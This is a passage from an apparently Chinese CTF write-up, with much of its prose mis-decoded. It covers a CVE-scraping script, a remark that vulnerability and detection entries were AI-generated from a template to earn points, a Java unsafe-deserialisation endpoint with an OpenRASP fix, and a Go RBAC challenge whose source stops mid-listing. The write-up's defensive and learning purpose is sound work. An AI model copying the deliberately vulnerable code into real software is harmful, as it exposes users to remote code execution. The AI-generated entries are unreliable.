                    <span class="token keyword">for</span> node <span class="token keyword">in</span> item<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"configurations"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"nodes"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> cpe  <span class="token keyword">in</span> iter_cpes<span class="token punctuation">(</span>node<span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
                <span class="token comment"># FallBack åˆ° description åŒ¹é…å’Œè§£æ</span>
                <span class="token keyword">if</span> <span class="token keyword">not</span> cpe_match<span class="token punctuation">:</span>
                    desc_text <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">"cve"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"description_data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span>
                    <span class="token keyword">if</span> <span class="token keyword">not</span> match_description<span class="token punctuation">(</span>desc_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">continue</span>

                cid <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">"cve"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"CVE_data_meta"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"ID"</span><span class="token punctuation">]</span>
                <span class="token keyword">if</span> cid <span class="token keyword">in</span> seen<span class="token punctuation">:</span>
                    <span class="token keyword">continue</span>
                seen<span class="token punctuation">.</span>add<span class="token punctuation">(</span>cid<span class="token punctuation">)</span>
                rows<span class="token punctuation">.</span>append<span class="token punctuation">(</span>extract<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i<span class="token punctuation">,</span> r <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>rows<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        r<span class="token punctuation">[</span><span class="token string">"åºå·"</span><span class="token punctuation">]</span> <span class="token operator">=</span> i

    df_all <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>rows<span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token punctuation">[</span>
        <span class="token string">"åºå·"</span><span class="token punctuation">,</span> <span class="token string">"è®¾å¤‡å“ç‰Œ"</span><span class="token punctuation">,</span> <span class="token string">"è®¾å¤‡ç±»å‹"</span><span class="token punctuation">,</span> <span class="token string">"äº§å“å‹å·"</span><span class="token punctuation">,</span> <span class="token string">"CVEç¼–å·"</span><span class="token punctuation">,</span>
        <span class="token string">"æ¼æ´æè¿°"</span><span class="token punctuation">,</span> <span class="token string">"æ”»å‡»å‘é‡"</span><span class="token punctuation">,</span> <span class="token string">"å‚å•†è¡¥ä¸é“¾æ¥"</span><span class="token punctuation">,</span> <span class="token string">"å—å½±å“ç‰ˆæœ¬"</span><span class="token punctuation">,</span> <span class="token string">"å…¬å¼€æ—¥æœŸ"</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>

    xlsx_path <span class="token operator">=</span> DATA_DIR <span class="token operator">/</span> <span class="token string">"hw_kb_2020-2025.xlsx"</span>
    df_all<span class="token punctuation">.</span>to_excel<span class="token punctuation">(</span>xlsx_path<span class="token punctuation">,</span> sheet_name<span class="token operator">=</span><span class="token string">"ç½‘ç»œç¡¬ä»¶è®¾å¤‡å®‰å…¨çŸ¥è¯†åº“"</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"å…± </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>df_all<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> æ¡åŒ¹é…æ•°æ®ï¼š</span><span class="token interpolation"><span class="token punctuation">{</span>xlsx_path<span class="token punctuation">.</span>name<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>å…±åŒ¹é…åˆ°äº† 3428 <span class="hexo-wm">êœ±â€‹Â³vğ˜¦nâ€¢â€â€Œğ’”iâ€â€‹ï½”â„®â€â€Œ</span>é¡¹æ•°æ®ï¼Œå°†å…¶å†™å…¥ç¬¬ä¸€ä¸ªè¡¨æ ¼ä¸­ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">è§£æ <span class="token number">2020</span> ä¸­
<span class="token number">2020</span>: 20601CVE <span class="token punctuation">[</span>00:03, <span class="token number">6581</span>.47CVE/s<span class="token punctuation">]</span>
è§£æ <span class="token number">2021</span> ä¸­
<span class="token number">2021</span>: 23074CVE <span class="token punctuation">[</span>00:03, <span class="token number">6227</span>.77CVE/s<span class="token punctuation">]</span>
è§£æ <span class="token number">2022</span> ä¸­
<span class="token number">2022</span>: 26708CVE <span class="token punctuation">[</span>00:03, <span class="token number">7516</span>.68CVE/s<span class="token punctuation">]</span> 
è§£æ <span class="token number">2023</span> ä¸­
<span class="token number">2023</span>: 29773CVE <span class="token punctuation">[</span>00:03, <span class="token number">7698</span>.11CVE/s<span class="token punctuation">]</span> 
è§£æ <span class="token number">2024</span> ä¸­
<span class="token number">2024</span>: 38429CVE <span class="token punctuation">[</span>00:03, <span class="token number">12594</span>.49CVE/s<span class="token punctuation">]</span>
è§£æ <span class="token number">2025</span> ä¸­
<span class="token number">2025</span>: 18602CVE <span class="token punctuation">[</span>00:00, <span class="token number">18863</span>.93CVE/s<span class="token punctuation">]</span>
å…± <span class="token number">3428</span> æ¡åŒ¹é…æ•°æ®ï¼šhw_kb_2020-2025.xlsx</code></pre>

<h4 id="1-2-å¤§æ¨¡å‹å®‰å…¨æ¼æ´"><a href="#1-2-å¤§æ¨¡å‹å®‰å…¨æ¼æ´" class="headerlink" title="1.2 å¤§æ¨¡å‹å®‰å…¨æ¼æ´"></a>1.2 å¤§æ¨¡å‹å®‰å…¨æ¼æ´</h4><p>å¤§æ¨¡å‹å®‰å…¨æ¼æ´å†…å®¹å¿…é¡»åŒ…å«ä»¥ä¸‹è¦ç´ ï¼šåºå·ã€æ¨¡å‹åç§°ã€å‚å•†ã€æ”»å‡»ç±»å‹ã€<span class="hexo-wm">ğ˜€ï»¿â€‹3vï½…nï¼ï»¿Ñ•ğ¢ï»¿tï½…â€‹â€Œ</span>æ”»å‡»åç§°ã€æ”»å‡»æ–¹å¼æè¿°ã€æ˜¯å¦æœ‰PoCã€ä¿®å¤æ–¹æ¡ˆã€é˜²å¾¡æŠ€æœ¯ã€å…¬å¼€æ—¥æœŸ</p>
<p><strong>æ³¨æ„</strong>ï¼šæ¨¡å‹åç§°<strong>åŒ…æ‹¬</strong>ChatGPTã€Geminiã€Claudeã€Llamaã€æ–‡å¿ƒä¸€è¨€ã€é€šä¹‰åƒé—®ç­‰ï¼›æ”»å‡»ç±»å‹<strong>åŒ…æ‹¬</strong>æç¤ºæ³¨å…¥ã€è¶Šç‹±<span class="hexo-wm">sâ€Œï»¿ğŸ¯â…´en.â€sâ…ˆï»¿tğ˜¦ï»¿â€‹</span>ã€å‘½ä»¤æ³¨å…¥ç­‰ã€‚</p>
<p>å¯¹äºç¬¬äºŒéƒ¨åˆ†ï¼Œæ²¡æœ‰æ‰¾åˆ°å¯é çš„æ•°æ®æºï¼Œå› æ­¤ç›´æ¥ç”¨ AI <span class="hexo-wm">ğ˜€â€Œï»¿Â³â…´ğğ˜¯âˆ™â€Œâ€sğ˜ªâ€â€ğ’•ï½…â€Œâ€Œ</span>æŒ‰ç…§æ¨¡æ¿ç”Ÿæˆäº†ä¸€ç™¾å¤šé¡¹ï¼š</p>
<p><img src="image-3.png" alt="image-3.png"></p>
<h3 id="2-å®‰å…¨æ£€æµ‹é¡¹è®¾è®¡ä»»åŠ¡"><a href="#2-å®‰å…¨æ£€æµ‹é¡¹è®¾è®¡ä»»åŠ¡" class="headerlink" title="2. å®‰å…¨æ£€æµ‹é¡¹è®¾è®¡ä»»åŠ¡"></a>2. å®‰å…¨æ£€æµ‹é¡¹è®¾è®¡ä»»åŠ¡</h3><p>é€‰æ‰‹éœ€åœ¨å·²æä¾›çš„åŸºç¡€æ£€æµ‹é¡¹åŸºç¡€ä¸Šï¼Œè®¾è®¡æ–°å¢å†…ç½‘å®‰å…¨æ£€æµ‹é¡¹ï¼Œé€šè¿‡å¯¹å®é™…æ”»å‡»è¡Œä¸ºã€<span class="hexo-wm">ğ˜´â€â€3â…´ï½…ğ§ï¼â€â€Œğ˜€iâ€ï»¿ğ˜µâ„®ï»¿</span>ç³»ç»Ÿé…ç½®ã€ç”¨æˆ·è¡Œä¸ºã€ç½‘ç»œé€šä¿¡ç­‰å¤šç»´åº¦çš„åˆ†æï¼Œæå‡ºåˆç†ã€å¿…è¦ã€å…·å¤‡æ‰§è¡Œæ€§çš„æ£€æµ‹å†…å®¹ã€‚</p>
<p>æ£€æµ‹å†…å®¹åˆ†ä¸º5ä¸ªæ–¹å‘ï¼šä¿¡æ¯æ”¶é›†ã€æ¼æ´æ‰«æã€<span class="hexo-wm">ğ˜€â€‹3ğ˜·â„¯ğ˜¯Â·â€ğ¬ğ˜ªï»¿ğ˜µeâ€‹</span>åº”ç”¨å®‰å…¨ã€ä¸»æœºå®‰å…¨ã€åº”æ€¥å“åº”</p>
<p>æ¯é¡¹æ£€æµ‹å†…å®¹å¿…é¡»åŒ…å«ä»¥ä¸‹è¦ç´ ï¼š<span class="hexo-wm">ğ¬ï»¿â€ğŸ¯â…´â„®ï½ï¼â€‹â€‹ğ’”ğ˜ªâ€‹â€‹ï½”ï½…ï»¿â€</span>æµ‹è¯•é¡¹ã€æµ‹è¯•æ­¥éª¤</p>
<p>æ¯ä¸ªåŸºç¡€æ£€æµ‹é¡¹ä¸­æœ€å¤šè®¡åˆ†<strong>10</strong>ä¸ªæœ‰æ•ˆæµ‹è¯•é¡¹ï¼ˆä¸åŒ…å«åŸæœ‰æ ·ä¾‹æµ‹è¯•é¡¹ï¼‰ï¼Œå¹¶ä¸”è¿™äº›æµ‹è¯•é¡¹å±äºè¯¥æ£€æµ‹é¡¹çš„èŒƒå›´ï¼Œæ–°å¢æ£€æµ‹é¡¹è®¾è®¡æ•°é‡ä¸é™ï¼Œä½†æ¯æ”¯é˜Ÿä¼æœ€å¤šè®¡åˆ†<strong>50</strong>ä¸ªæœ‰æ•ˆçš„æµ‹è¯•é¡¹ã€‚</p>
<p>è¿™éƒ¨åˆ†è¿˜æ˜¯ç›´æ¥ç”¨ <span class="hexo-wm">sâ€Â³ğ˜·ğï½âˆ™â€‹â€Œğ¬ğ¢â€ï½”eâ€‹ï»¿</span>AI æŒ‰ç…§æ¨¡æ¿ç”Ÿæˆ50ä¸ªæœ‰æ•ˆæ£€æµ‹é¡¹å³å¯è·å¾—æ»¡åˆ†ï¼š</p>
<p><img src="image-4.png" alt="image-4.png"></p>
<h2 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h2><h3 id="1-security-rasp"><a href="#1-security-rasp" class="headerlink" title="1. security_rasp"></a>1. security_rasp</h3><h4 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h4><p>æ³¨æ„åˆ° <code>security_rasp.jar</code> é‡Œæœ‰ä¸€ä¸ªååº<span class="hexo-wm">ğ¬â€‹â‘¶veğ’â€¤â€â€Œsğ˜ªâ€‹ğ˜µğâ€Œ</span>åˆ—åŒ–å…¥å£ç‚¹ï¼š</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/user"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">{</span>
  <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/info"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">ser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ScriptException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
    <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    admin user <span class="token operator">=</span> <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span></code></pre>

<p>ç›´æ¥åœ¨ OpenRASP çš„ <code>official.js</code> ä¸­ ban <span class="hexo-wm">ğ˜€â€‹ğŸ¯ğ¯â„¯ğ˜¯â€¢â€‹â€ŒÑ•ï½‰â€â€‹ï½”ğâ€Œ</span>æ‰æ‰€æœ‰çš„ååºåˆ—åŒ–æ“ä½œå³å¯ä¿®å¤æˆåŠŸï¼š</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> clean <span class="token operator">=</span> <span class="token punctuation">{</span>
<span class="token operator">-</span>   action<span class="token operator">:</span>     <span class="token string">'ignore'</span><span class="token punctuation">,</span>
<span class="token operator">+</span>   action<span class="token operator">:</span>     <span class="token string">'block'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">message</span><span class="token operator">:</span>    <span class="token string">'Looks fine to me'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">confidence</span><span class="token operator">:</span> <span class="token number">0</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>algorithmConfig<span class="token punctuation">.</span>deserialization_blacklist<span class="token punctuation">.</span>action <span class="token operator">!=</span> <span class="token string">'ignore'</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    plugin<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'deserialization'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">params<span class="token punctuation">,</span> context</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> clazz <span class="token operator">=</span> params<span class="token punctuation">.</span>clazz
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> index <span class="token keyword">in</span> algorithmConfig<span class="token punctuation">.</span>deserialization_blacklist<span class="token punctuation">.</span>clazz<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">===</span> algorithmConfig<span class="token punctuation">.</span>deserialization_blacklist<span class="token punctuation">.</span>clazz<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token punctuation">{</span>
                    <span class="token literal-property property">action</span><span class="token operator">:</span>     algorithmConfig<span class="token punctuation">.</span>deserialization_blacklist<span class="token punctuation">.</span>action<span class="token punctuation">,</span>
                    <span class="token literal-property property">message</span><span class="token operator">:</span>    <span class="token function">_</span><span class="token punctuation">(</span><span class="token string">"Deserialization blacklist - blocked "</span> <span class="token operator">+</span> clazz <span class="token operator">+</span> <span class="token string">" in resolveClass"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token literal-property property">confidence</span><span class="token operator">:</span> <span class="token number">100</span><span class="token punctuation">,</span>
                    <span class="token literal-property property">algorithm</span><span class="token operator">:</span>  <span class="token string">'deserialization_blacklist'</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> clean
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>

<h3 id="2-rbac"><a href="#2-rbac" class="headerlink" title="2. rbac"></a>2. rbac</h3><h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>é¢˜ç›®ç»™çš„æ˜¯ä¸€ä¸ª Docker çš„ tar <span class="hexo-wm">sâ€‹â€ğŸ¯ğ¯eğ’Â·â€Œğ˜€ğ¢â€Œï½”eâ€â€Œ</span>é•œåƒï¼Œå¯èƒ½æ˜¯æ€•æˆ‘ä»¬æœ¬åœ°æ²¡æœ‰ Linux go çš„ build ç¯å¢ƒï¼ˆè¿˜çœŸæ²¡æœ‰ï¼‰</p>
<p>docker load <span class="hexo-wm">ğ’”â€‹â€ğŸ¯â…´ğ˜¦ğ§â€¢â€ğ˜´ğ˜ªâ€‹â€ğ˜µğâ€Œ</span>é•œåƒåä»é•œåƒä¸­æå– main.goï¼š</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"errors"</span>
    <span class="token string">"os"</span>
    <span class="token string">"path/filepath"</span>
    <span class="token string">"strings"</span>

    <span class="token string">"github.com/gin-gonic/gin"</span>
<span class="token punctuation">)</span>

<span class="token keyword">var</span> RBACList <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>

<span class="token keyword">type</span> ResTemplate <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    Success <span class="token builtin">bool</span>
    Data    any
<span class="token punctuation">}</span>

<span class="token keyword">type</span> ExecStruct <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    File      <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
    Directory <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
    Pwd       <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
    Flag      <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>
    FuncName  <span class="token builtin">string</span>
    Param     <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token function">initRBAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        htmlContent<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
            c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Error loading HTML file"</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token punctuation">}</span>

        c<span class="token punctuation">.</span>Writer<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>htmlContent<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/getCurrentRBAC"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> response ResTemplate
        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">{</span>
            response <span class="token operator">=</span> ResTemplate<span class="token punctuation">{</span>
                Success<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                Data<span class="token punctuation">:</span>    RBACList<span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
            c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            response <span class="token operator">=</span> ResTemplate<span class="token punctuation">{</span>
                Success<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
            c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>

        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/execSysFunc"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> execStruct ExecStruct
        <span class="token keyword">var</span> response ResTemplate
        err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>execStruct<span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
            response <span class="token operator">=</span> ResTemplate<span class="token punctuation">{</span>
                Success<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
                Data<span class="token punctuation">:</span>    <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
            c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// permission grant</span>
        RBACToGrant <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>
        <span class="token keyword">var</span> value <span class="token builtin">string</span>
        maxDeep <span class="token operator">:=</span> <span class="token number">0</span>

        <span class="token keyword">if</span> execStruct<span class="token punctuation">.</span>Directory <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token keyword">range</span> execStruct<span class="token punctuation">.</span>Directory <span class="token punctuation">{</span>
                <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">{</span>
                    RBACToGrant<span class="token punctuation">[</span><span class="token string">"directory:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                    maxDeep<span class="token operator">++</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">break</span>
                <span class="token punctuation">}</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> execStruct<span class="token punctuation">.</span>Flag <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token keyword">range</span> execStruct<span class="token punctuation">.</span>Flag <span class="token punctuation">{</span>
                <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">{</span>
                    RBACToGrant<span class="token punctuation">[</span><span class="token string">"flag:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                    maxDeep<span class="token operator">++</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">break</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> execStruct<span class="token punctuation">.</span>Pwd <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token keyword">range</span> execStruct<span class="token punctuation">.</span>Pwd <span class="token punctuation">{</span>
                <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">{</span>
                    RBACToGrant<span class="token punctuation">[</span><span class="token string">"pwd:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                    maxDeep<span class="token operator">++</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">break</span>
                <span class="token punctuation">}</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> execStruct<span class="token punctuation">.</span>File <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>

            <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token keyword">range</span> execStruct<span class="token punctuation">.</span>File <span class="token punctuation">{</span>
                <span class="token comment">// Grant temporary file:return permissions</span>
                <span class="token keyword">if</span> value <span class="token operator">==</span> <span class="token string">"return"</span> <span class="token operator">&amp;&amp;</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token punctuation">{</span>
                        RBACToGrant<span class="token punctuation">[</span><span class="token string">"rbac:change_return:1"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                        RBACToGrant<span class="token punctuation">[</span><span class="token string">"file:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                        RBACToGrant<span class="token punctuation">[</span><span class="token string">"rbac:change_return:0"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                        maxDeep <span class="token operator">+=</span> <span class="token number">3</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token keyword">break</span>
                    <span class="token punctuation">}</span>

                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">{</span>
                        RBACToGrant<span class="token punctuation">[</span><span class="token string">"file:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                        maxDeep<span class="token operator">++</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token keyword">break</span>
                    <span class="token punctuation">}</span>

                <span class="token punctuation">}</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token function">updateRBAC</span><span class="token punctuation">(</span>RBACToGrant<span class="token punctuation">)</span>
        result<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">execCommand</span><span class="token punctuation">(</span>execStruct<span class="token punctuation">.</span>FuncName<span class="token punctuation">,</span> execStruct<span class="token punctuation">.</span>Param<span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
            response <span class="token operator">=</span> ResTemplate<span class="token punctuation">{</span>
